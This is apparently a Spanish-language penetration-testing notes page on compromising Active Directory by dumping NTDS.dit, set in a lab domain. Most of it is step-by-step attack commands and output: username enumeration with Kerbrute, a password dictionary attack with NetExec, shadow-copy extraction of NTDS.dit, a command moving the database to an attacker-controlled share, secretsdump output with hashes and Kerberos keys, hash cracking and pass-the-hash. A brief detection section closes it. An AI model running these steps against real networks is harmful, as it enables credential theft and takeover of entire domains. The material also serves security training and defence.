# Active Directory y NTDS.dit

`NTDS.dit` es la base de datos principal del Domain Controller de Active Directory. Almacena todos los objetos del dominio: cuentas de usuario, grupos, políticas y los hashes NTLM y claves Kerberos de todos los usuarios. Comprometer NTDS.dit equivale a comprometer el dominio entero — se obtienen las credenciales de cada cuenta existente.

Cuando un sistema Windows se une a un dominio, deja de validar logins contra SAM local y pasa a enviar las solicitudes al DC. Esto no inutiliza SAM (los logins locales siguen funcionando especificando `hostname\usuario` o `.\usuario`), pero el objetivo principal en un dominio es siempre NTDS.dit.

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### Ubicación y requisitos

El archivo reside en `C:\Windows\NTDS\NTDS.dit` en el Domain Controller. Al igual que SAM, requiere la boot key almacenada en `SYSTEM` para descifrar los hashes — sin ella los datos son ilegibles.

> NTDS.dit está en uso continuo por el proceso `ntdsa.dll`. No puede copiarse directamente con `xcopy` o `robocopy`. Se necesitan VSS o las APIs de replicación del DC.

Se necesita al menos uno de los siguientes para extraerlo:

* Membresía en **Domain Admins** o **Enterprise Admins**
* Permisos de replicación (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`) para DCSync
* Shell con privilegios de administrador local en el DC para VSS

### Ataque de diccionario previo — obtener credenciales de DA

Antes de poder volcar NTDS.dit se necesitan credenciales con privilegios suficientes. Un ataque de diccionario contra cuentas AD puede ser el punto de entrada.

#### Construcción de lista de usuarios

Las organizaciones siguen convenciones de nomenclatura predecibles. Combinando OSINT (LinkedIn, web corporativa, emails filtrados) con herramientas de generación se construye una lista de candidatos:

```bash
# Username Anarchy — genera variantes a partir de nombres reales
./username-anarchy -i nombres.txt > usernames.txt
```

Convenciones habituales para un usuario "Jane Doe":

| Convención             | Resultado  |
| ---------------------- | ---------- |
| `firstinitiallastname` | `jdoe`     |
| `firstnamelastname`    | `janedoe`  |
| `firstname.lastname`   | `jane.doe` |
| `lastname.firstname`   | `doe.jane` |

#### Validar usuarios con Kerbrute

Antes de lanzar contraseñas, validar qué usuarios existen evita intentos inútiles y reduce ruido:

```bash
kerbrute userenum --dc 10.129.201.57 --domain inlanefreight.local usernames.txt
# [+] VALID USERNAME: bwilliamson@inlanefreight.local
```

#### Ataque de diccionario con NetExec

```bash
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
# [+] inlanefreight.local\bwilliamson:P@55w0rd!
```

> Este ataque es ruidoso — genera eventos de login fallido en masa (Event ID 4776). Si hay política de lockout activa, puede bloquear la cuenta objetivo. Por defecto la política de dominio de Windows no habilita lockout, pero muchos entornos lo configuran manualmente. Usar password spraying cuando hay lockout.

### Extracción de NTDS.dit — VSS manual

Con acceso al DC via Evil-WinRM u otra shell:

```bash
# Conectar al DC con credenciales obtenidas
evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```

```powershell
# Verificar membresía — necesitamos DA o Administrators local en el DC
net user bwilliamson
# Global Group memberships: *Domain Users  *Domain Admins ← necesario

# Crear shadow copy del volumen C:
vssadmin CREATE SHADOW /For=C:
# Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

# Copiar NTDS.dit desde la shadow copy
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit

# Mover al share del host atacante (ver sección SAM para montar el share)
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

También con `ntdsutil` — genera una copia consistente de NTDS.dit + SYSTEM:

```cmd
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds_dump" q q
```

### Extracción remota — NetExec (método rápido)

NetExec automatiza todo el proceso VSS en un solo comando:

```bash
netexec smb 10.129.201.57 -u bwilliamson -p 'P@55w0rd!' -M ntdsutil
```

Descarga automáticamente el dump a `~/.nxc/logs/`. Para filtrar solo cuentas habilitadas del output:

```bash
grep -iv disabled ~/.nxc/logs/DC01_*.ntds | cut -d ':' -f1
```

### DCSync — sin acceso físico al DC

Si se tienen permisos de replicación (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`), no es necesario acceder al DC. Ver página [Pass-the-Hash y movimiento lateral](https://claude.ai/movimiento-lateral/pass-the-hash-pth.md) para el flujo completo de DCSync con secretsdump y Mimikatz.

### Procesado offline — secretsdump

Con NTDS.dit y SYSTEM en el host atacante:

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

Salida:

```
[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
inlanefreight.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
```

Además de los NT hashes, secretsdump extrae las claves Kerberos AES de cada cuenta:

```
Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
```

Las claves AES son más seguras para Pass-the-Ticket y Golden Ticket que los NT hashes en entornos con RC4 deshabilitado.

### Cracking y uso de los hashes

```bash
# Cracking con Hashcat
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b rockyou.txt
# 64f12cddaa88057e06a81b54e73b949b:Password1

# Si el cracking falla — Pass-the-Hash directamente
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

> El hash de `krbtgt` es el objetivo más valioso del dominio — permite crear Golden Tickets. El de `Administrator` da acceso inmediato a todos los sistemas donde esa cuenta tenga privilegios. Ver [Pass-the-Ticket](https://claude.ai/movimiento-lateral/pass-the-ticket-ptt-desde-windows.md) para el uso completo de ambos.

### Detección

El volcado de NTDS.dit via VSS genera eventos auditables:

| Event ID | Descripción                                          |
| -------- | ---------------------------------------------------- |
| `4662`   | Operación realizada sobre objeto AD (DCSync)         |
| `4688`   | Creación de proceso — `vssadmin.exe`, `ntdsutil.exe` |
| `7036`   | Servicio VSS iniciado                                |

Microsoft Defender for Identity detecta DCSync por el patrón de replicación anómala desde una cuenta que no es DC. El volcado via VSS en el propio DC es menos detectable pero requiere acceso previo con privilegios elevados.
